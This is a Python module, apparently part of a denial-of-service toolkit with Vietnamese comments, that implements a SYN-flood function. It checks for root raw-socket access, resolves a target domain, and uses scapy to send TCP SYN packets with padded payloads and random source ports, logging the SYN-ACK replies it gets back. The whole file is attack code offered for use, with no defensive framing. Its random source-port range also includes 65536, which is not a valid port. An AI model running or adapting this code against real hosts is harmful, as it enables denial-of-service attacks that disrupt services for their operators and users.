import socket
import logging
from random import randint

from colorama import Fore as F
from scapy.all import Raw, sr1
from scapy.layers.inet import IP, TCP

from tools.addons.ip_tools import get_target_domain

# Cấu hình logging
logging.basicConfig(level=logging.INFO, format="%(asctime)s - %(levelname)s - %(message)s")

def check_root_access() -> bool:
    """Kiểm tra quyền root (yêu cầu để sử dụng socket raw)."""
    try:
        socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        return True
    except PermissionError:
        logging.error(f"{F.RED}[!] Quyền root là bắt buộc để thực hiện SYN-FLOOD attack{F.RESET}")
        return False

def flood(target: str) -> None:
    """Gửi gói SYN đến mục tiêu.

    Args:
        target (str): Địa chỉ mục tiêu (có thể là domain hoặc IP, bao gồm cả cổng nếu cần).

    Returns:
        None
    """
    if not check_root_access():
        return

    # Xử lý tên miền và cổng từ đầu vào mục tiêu
    try:
        domain, port = get_target_domain(target)
        ip_addr = socket.gethostbyname(domain)
    except socket.gaierror:
        logging.error(f"{F.RED}[!] Không thể xác định địa chỉ IP cho {target}{F.RESET}")
        return

    # Thiết lập lớp IP và TCP
    ip_layer = IP(dst=ip_addr)
    sport = randint(1024, 65536)
    tcp_layer = TCP(sport=sport, dport=port, flags="S")
    data = Raw(b"X" * 1024)
    packet = ip_layer / tcp_layer / data

    # Gửi gói SYN và kiểm tra phản hồi SYN-ACK
    try:
        ans = sr1(packet, verbose=0)
        # Kiểm tra flag: SYN-ACK (0x12 = 18) nếu TCP có flag SYN (0x02) và ACK (0x10)
        if ans and ans[TCP].flags & 0x12 == 0x12:
            logging.info(f"--> Socket trên Port {sport:<5} đã gửi gói SYN")
    except Exception as e:
        logging.error(f"{F.RED}[!] Lỗi khi gửi gói tin: {e}{F.RESET}")